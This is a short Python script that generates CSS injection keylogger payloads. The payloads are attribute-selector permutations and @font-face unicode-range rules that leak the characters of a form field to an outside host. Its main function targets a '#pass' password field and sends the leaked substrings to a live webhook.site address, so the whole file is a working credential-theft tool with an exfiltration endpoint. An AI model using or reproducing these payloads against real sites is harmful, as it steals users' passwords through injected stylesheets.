import itertools
import string


def gen_css_selector_keylogger(addr_for_prefix, addr_for_suffix, element, attribute, case_insensitive, alphabet, substr_len):
    params = dict(addr_4prefix=addr_for_prefix,
                    addr_4suffix=addr_for_suffix,
                    element=element,
                    attribute='value',
                    property_4prefix='background',
                    property_4suffix='content',
                    case_mode=' i' if case_insensitive else '')

    CSS_SELECTOR_KEYLOGGER_TEMPLATE = (
        '$element[$attribute^="$subset"$case_mode]{$property_4prefix:url("$addr_4prefix$subset");}'
        '$element[$attribute$$$="$subset"$case_mode]{$property_4suffix:url("$addr_4suffix$subset");}'
    )
    tpl = string.Template(CSS_SELECTOR_KEYLOGGER_TEMPLATE).safe_substitute(params)
    for subset in itertools.permutations(alphabet, substr_len):
        subset = ''.join(subset)
        print(string.Template(tpl).substitute(subset=subset), end='')
        


def gen_css_font_keylogger(addr, element, font, alphabet):
    '''
        not work for input[type="password"]
    '''
    for ch in alphabet:
        codepoint = ('U+%04x' % ord(ch))
        print(f'@font-face{{font-family:{font};src:url("{addr}{ch}"),local(Arial);unicode-range:{codepoint};}}', end='')
    print(f'{element}{{font-family:{font},sans-serif;}}', end='')


def main():
    alphabet = 'abcdefghijklmnopqrstuvwxyz0123456789'
    addr = 'https://webhook.site/901584d7-2330-4ae6-9afe-ea61c4adeb4b/'
    gen_css_selector_keylogger(
        addr_for_prefix= addr + 'prefix/',
        addr_for_suffix= addr + 'suffix/',
        element='#pass',
        attribute='value',
        case_insensitive=True,
        alphabet=alphabet,
        substr_len=4
    )

    '''
    gen_css_font_keylogger(
        addr= addr + 'font/',
        element='#pass',
        font='myfont',
        alphabet=alphabet
    )
    '''
    

if __name__ == '__main__':
    main()